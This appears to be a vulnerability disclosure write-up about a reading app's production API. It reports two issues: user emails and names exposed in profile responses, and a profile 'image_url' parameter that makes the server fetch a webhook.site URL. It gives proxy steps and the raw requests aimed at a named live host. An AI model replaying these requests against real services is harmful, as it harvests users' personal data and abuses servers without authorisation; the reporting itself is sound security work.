## User Email Enumeration

**Description:** There are different places throughout the application where the user's Google-connected first and last name, email address, and follower counts can be seen in server responses.

**Note:** This is not the only endpoint affected by this.

1. While using a web proxy, such as Burp Suite, navigate to an arbitrary user's profile.

2. Observe that their personal information can be seen in the response.

```http
GET /api/v1/users/jenniferPagebound HTTP/2
Host: prod-pagebound-api.onrender.com
[TRUNCATED]
```

**HTTP Response:**

## Server-Side Request Forgery & Function Bypass
**Description:** This isn't that bad if it's intended functionality and as long as there are protections in place. Since a custom profile picture wasn't an option though, I figured I'd mention it.

1. Navigate to the currently authenticated user's profile page.

2. While using a web proxy, such as Burp Suite, click "Update".

3. Modify the "image_url" parameter of the request to point to a URL that supports logging or webhooks, such as webhook[.]site. Observe the successful response.

**HTTP Request:**
```http
POST /api/v1/users/update_profile HTTP/2
Host: prod-pagebound-api.onrender.com
[TRUNCATED]

{"user":{"username":"alp1n3","bio":"fantasy, sci-fi, suspense | ðŸ”®","image_url":"/assets/dragon.png"},"showcased_badges":[28761]}
```

**Modified HTTP Request:**
```http
POST /api/v1/users/update_profile HTTP/2
Host: prod-pagebound-api.onrender.com
[TRUNCATED]

{"user":{"username":"alp1n3","bio":"fantasy, sci-fi, suspense | ðŸ”®","image_url":"https://webhook.site/2b70ad00-88d4-4760-86b4-a1f1be830512"},"showcased_badges":[28761]}
```

**Response:**
```http
HTTP/2 200 OK
Date: Tue, 15 Jul 2025 00:20:53 GMT
[TRUNCATED]
```

4. Refresh the user's profile page to force the image to be requested. 
5. Navigate to the logs of the web hook and observe that a request was sent by the server.

6. This method can be used to set a custom profile picture as well, which isn't currently possible in the application's user interface.
